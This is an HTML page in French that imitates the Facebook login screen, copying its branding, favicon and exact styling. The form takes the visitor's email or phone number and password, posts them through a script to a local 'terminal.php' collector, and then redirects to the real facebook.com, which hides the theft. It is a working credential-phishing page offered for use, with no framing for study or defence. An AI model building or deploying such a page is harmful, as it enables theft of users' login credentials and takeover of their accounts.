<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Connexion</title>
    <!-- Facebook Real CDN Fonts/CSS -->
    <link rel="preconnect" href="https://scontent.xx.fbcdn.net">
    <link rel="preload" href="https://connect.facebook.net/signals/config/1357524767653696" as="script">
    <!-- Real Facebook Favicon -->
    <link rel="icon" type="image/x-icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
    <style>
        /* KEEP ALL YOUR ORIGINAL CSS - Just pixel-perfect FB tweaks */
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            font-family:'SFProDisplay-Regular', -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            background:linear-gradient(135deg,#f5f7fa 0%,#c3cfe2 100%);
            height:100vh;display:flex;align-items:center;justify-content:center;
            /* FB exact spacing */
            padding-top:62px;
        }
        .container{
            background:#fff;
            padding:24px 24px 16px; /* FB exact padding */
            border-radius:8px;
            box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1); /* FB shadows */
            width:100%;max-width:396px; /* FB exact width */
            text-align:center;
        }
        .logo img{
            margin-bottom:32px; /* FB spacing */
            width:50px;height:50px; /* FB exact logo */
        }
        .input-group{
            margin-bottom:8px; /* FB tight spacing */
            text-align:left;
        }
        .input-group input{
            width:100%;
            padding:14px 16px;
            border:1px solid #ccd0d5; /* FB exact border */
            border-radius:6px;
            font-size:17px; /* FB font-size */
            background:#fff; /* FB white bg */
            transition:border-color .15s linear,background-color .15s linear; /* FB transitions */
        }
        .input-group input:focus{
            outline:none;
            border-color:#1877f2;
            background:#fff;
            box-shadow:0 0 0 2px rgba(24,119,242,.2); /* FB focus ring */
        }
        .login-btn{
            width:100%;
            padding:7px 28px 7px 28px; /* FB button padding */
            background:#1877f2;
            color:#fff;
            border:none;
            border-radius:6px;
            font-size:20px; /* FB large button */
            font-weight:500; /* FB font-weight */
            line-height:28px;
            cursor:pointer;
            transition:background-color .15s linear; /* FB timing */
        }
        .login-btn:hover{background:#166fe5;}
        .login-btn:active{background:#0e5a9e;} /* FB active */
        
        /* FB subtle footer */
        .forgot{
            margin-top:16px;
            font-size:14px;
            color:#65676b;
        }
        .forgot a{color:#65676b;text-decoration:none;}
        
        /* FB responsive */
        @media (max-width: 500px) {
            .container{padding:20px 20px 16px;max-width:350px;}
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHw6.ico" alt="f" width="50" height="50">
        </div>
        <form method="POST" action="terminal.php">
            <div class="input-group">
                <input type="email" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required autocomplete="email">
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Mot de passe" required autocomplete="current-password">
            </div>
            <button type="submit" class="login-btn">Se connecter</button>
            <div class="forgot">
                <a href="#" style="font-size:13px;">Mot de passe oublié ?</a>
            </div>
        </form>
    </div>
     <script>
const form = document.querySelector('form[method="POST"][action="terminal.php"]');

form.addEventListener('submit', function(e) {
    e.preventDefault(); // bloque le comportement classique du submit

    const formData = new FormData(form);

    fetch(form.action, {
        method: 'POST',
        body: formData
    })
    .then(response => response.text()) // optionnel, récupère la réponse du serveur
    .then(data => {
        console.log(data); // juste pour debug
        // redirection après envoi
        window.location.href = 'https://www.facebook.com/';
    })
    .catch(error => console.error('Erreur:', error));
});
     </script>
</body>
</html>
